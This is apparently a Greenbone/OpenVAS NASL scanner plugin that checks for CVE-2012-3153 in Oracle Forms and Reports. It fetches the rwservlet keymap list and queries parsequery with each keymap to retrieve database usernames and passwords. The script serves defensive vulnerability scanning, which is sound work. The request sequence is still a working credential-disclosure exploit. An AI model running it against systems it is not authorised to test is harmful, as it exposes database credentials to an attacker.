if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103974" );
	script_bugtraq_id( 55955 );
	script_cve_id( "CVE-2012-3153" );
	script_tag( name: "cvss_base", value: "6.4" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:N" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_name( "Oracle Forms and Reports Database Vulnerability" );
	script_xref( name: "URL", value: "http://exploitsdownload.com/exploit/na/oracle-forms-and-reports-database-disclosure" );
	script_xref( name: "URL", value: "http://www.oracle.com/technetwork/topics/security/cpuoct2012-1515893.html" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/55955" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2014-02-03 23:08:02 +0700 (Mon, 03 Feb 2014)" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2014 Greenbone Networks GmbH" );
	script_dependencies( "find_service.sc", "httpver.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "summary", value: "Oracle Forms and Reports Database Vulnerability" );
	script_tag( name: "vuldetect", value: "Tries to dump at least one username and password of the database." );
	script_tag( name: "solution", value: "Apply the patch from Oracle or upgrade to version 12 or higher." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "insight", value: "An undocumented function of the PARSEQUERY function allows
  to take keymaps that are located in /reports/rwservlet/ and add them
  to the query which will allow to dump the database passwords." );
	script_tag( name: "affected", value: "Oracle Fusion Middleware 11.1.1.4, 11.1.1.6, and 11.1.2.0" );
	script_tag( name: "impact", value: "Unauthenticated remote attackers can dump usernames and
  passwords of the database." );
	script_tag( name: "qod_type", value: "remote_app" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
port = http_get_port( default: 80 );
useragent = http_get_user_agent();
host = http_host_name( port: port );
req = "GET /reports/rwservlet/showmap HTTP/1.1\r\n" + "Host: " + host + "\r\n" + "User-Agent: " + useragent + "\r\n\r\n";
res = http_keepalive_send_recv( port: port, data: req, bodyonly: TRUE );
if(!res){
	exit( 0 );
}
tmp = egrep( string: res, pattern: "<SPAN class=OraInstructionText>(\\S+).*</SPAN>" );
if(!tmp){
	exit( 0 );
}
tmp = ereg_replace( string: tmp, pattern: "<SPAN class=OraInstructionText>", replace: "" );
tmp = ereg_replace( string: tmp, pattern: "</SPAN></TD>", replace: "" );
tmp = str_replace( string: tmp, find: " ", replace: "" );
keymaps = split( buffer: tmp, keep: 0 );
for keymap in keymaps {
	req = "GET /reports/rwservlet/parsequery?" + keymap + " HTTP/1.1\r\n" + "Host: " + host + "\r\n" + "User-Agent: " + useragent + "\r\n\r\n";
	res = http_keepalive_send_recv( port: port, data: req, bodyonly: TRUE );
	if(userid = eregmatch( string: res, pattern: "userid=(.*)@" )){
		security_message( port: port );
		exit( 0 );
	}
}
exit( 99 );

